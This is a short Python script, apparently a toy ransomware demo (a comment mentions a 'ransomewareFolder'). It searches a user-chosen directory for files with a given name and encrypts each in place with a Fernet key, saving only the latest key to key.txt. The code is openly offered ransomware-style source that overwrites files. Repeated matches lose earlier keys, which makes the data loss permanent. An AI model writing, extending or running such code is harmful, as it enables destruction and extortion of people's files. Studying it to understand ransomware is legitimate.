import pathlib
import cryptography
from cryptography.fernet import Fernet

def encrypt(filename):
    #This commented line generates a random key
    key = Fernet.generate_key()
    newKey = Fernet(key)

    #The following commented code copies the key into a text file
    f = open("key.txt", "w")
    f.write(key.decode())
    f.close()
    
    #Read through the entire file    
    with open(filename, "rb") as file:
        file_data = file.read()
        
    #Encrypts it using the key
    encrypted_data = newKey.encrypt(file_data)

    #Rewrites it into the file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def find(filename):
    #looks for a folder called ransomewareFolder
    for child in pathlib.Path(input("Choose directory (Provide full path): ")).rglob("*"):
        if child.name == filename:
            encrypt(str(child))

#feel free to change this to an input or any file you want
find(input("Choose file to encrypt: "))


